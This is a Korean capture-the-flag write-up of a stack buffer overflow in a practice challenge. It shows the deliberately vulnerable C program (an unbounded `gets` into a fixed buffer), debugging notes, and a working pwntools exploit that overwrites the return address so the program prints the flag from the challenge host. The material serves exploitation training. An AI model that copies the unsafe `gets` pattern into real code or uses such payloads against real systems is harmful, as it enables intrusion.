# [Dreamhack] basic_exploitation_001(SBO)

---

![Untitled](./[Dreamhack]_basic_exploitation_001(SBO).assets/Untitled.png)

### 문제 소스코드

```python
#include <stdio.h>
#include <stdlib.h>
#include <signal.h>
#include <unistd.h>

void alarm_handler() {
    puts("TIME OUT");
    exit(-1);
}

void initialize() {
    setvbuf(stdin, NULL, _IONBF, 0);
    setvbuf(stdout, NULL, _IONBF, 0);

    signal(SIGALRM, alarm_handler);
    alarm(30);
}

void read_flag() {
    system("cat /flag");
}

int main(int argc, char *argv[]) {

    char buf[0x80];

    initialize();
    
    gets(buf);

    return 0;
}

```

### 1. 취약점 분석

- `gets` 함수를 사용해 string 값을 길이에 상관없이 입력을 받는 것을 확인
- 해당 main함수에 `return address` 를 `read_flag()` 함수에 주소로 설정하면 Flag값을 획득 할 수 있을 것 같음

### 2. 디버깅

- `main` 함수에 breakpoint를 설정하고 스택 구조를 확인
- 스택 구조는 아래와 같음

![Untitled](./[Dreamhack]_basic_exploitation_001(SBO).assets/Untitled%201.png)

![Untitled](./[Dreamhack]_basic_exploitation_001(SBO).assets/Untitled%202.png)

- 디버깅을 통해서 `read_flag()` 함수에 주소를 확인
    - `0x80485b9`

![Untitled](./[Dreamhack]_basic_exploitation_001(SBO).assets/Untitled%203.png)

### 3. 익스플로잇

- 해당 문제에서는 바로 Python 익스플로잇 코드를 작성
    - `p32(0x080485b9)` 주소를 바이트 형식으로 추가하기 위해 `p32` 함수를 사용해야 함.
    - 이는 주소를 리틀 엔디안 형식으로 변환하여 올바르게 페이로드에 추가해줌

```python
from pwn import *

context.arch="i386"
p = remote('host3.dreamhack.games', 14077)
payload = b"A"*(132)
payload += p32(0x080485b9)
p.sendline(payload)
p.interactive()
```